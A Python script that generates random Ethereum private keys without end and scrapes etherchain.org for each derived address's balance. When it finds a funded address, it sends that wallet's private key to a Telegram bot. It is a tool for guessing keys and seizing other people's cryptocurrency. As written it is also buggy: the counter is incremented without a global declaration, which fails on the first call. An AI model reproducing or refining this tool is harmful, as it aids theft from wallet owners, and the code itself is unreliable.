from ecdsa import SigningKey, SECP256k1
import sha3
import re
import requests
from time import sleep
from datetime import datetime
import requests
from bs4 import BeautifulSoup
TEST = False
import tgBot

amount = 0

def guess():

    amount+=1
    keccak = sha3.keccak_256()

    priv = SigningKey.generate(curve=SECP256k1)
    pub = priv.get_verifying_key().to_string()

    keccak.update(pub)
    address = keccak.hexdigest()[24:]
    # print(datetime.now().isoformat(), flush=True)
    # print("Private key:", priv.to_string().hex(), flush=True)
    # print("Public key: ", pub.hex(), flush=True)
    # print("Address:     0x" + address, flush=True)

    data = "Private key:" + priv.to_string().hex()+"\n"
    url = "https://www.etherchain.org/account/0x" + address
    page = requests.get(url)

    soup = BeautifulSoup(page.content, "html.parser")

    results = soup.find("span",{"class":"badge badge-success"}).getText()
    data+="ETH:"+str(results)
    print(data)
    results = results.replace(" ETH", "")

    print(float(results))

    # <span class="badge badge-success">0.00000 ETH</span>

    if (float(results)>0):
        tgBot.SendData(data)
    print(data)

    if (amount%100 == 0):
        tgBot.SendData(str(amount))

while 1:
    guess()
    # sleep(1)
